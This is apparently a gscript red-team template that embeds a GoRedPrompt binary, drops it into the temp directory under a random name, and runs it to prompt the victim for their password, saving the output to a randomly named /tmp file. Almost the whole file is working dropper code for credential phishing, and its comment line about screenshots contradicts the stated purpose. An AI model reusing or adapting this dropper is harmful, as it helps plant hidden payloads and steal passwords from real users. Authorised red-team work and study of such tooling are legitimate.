// Example gscript template
// Title: GoRedPrompt 
// Author: ahhh
// Purpose: Prompts the user for their password
// Gscript version: 1.0.0
// ATT&CK: 
// Uses: GoRedPrompt to take screenshots: https://github.com/ahhh/GoRedPrompt

//priority:150
//timeout:150

//go_import:os as os2

//import:/private/tmp/GoRedPrompt.elf

function Deploy() {  
    console.log("Starting GoRedPrompt");
    // Getting our asset
    var promptBin = GetAssetAsBytes("GoRedPrompt.elf");
    console.log("errors: "+Dump(promptBin[1]));

    // Getting a random name and dropping file
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaString(6);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    G.file.WriteFileFromBytes(name, promptBin[0]);
    console.log("dropped the goredprompt binary here: "+name);

    // Create random out file
    var outfile = G.rand.GetAlphaNumericString(5);
    outfile = "/tmp/"+outfile.toLowerCase();
      
    // Executing child proc
    var proc = G.exec.ExecuteCommandAsync(name, [outfile]);
    console.log("err: "+Dump(proc[1]));
    console.log("pid: "+proc[0].Process.Pid);
    
    console.log("Done GoRedPrompt");
    return true;
}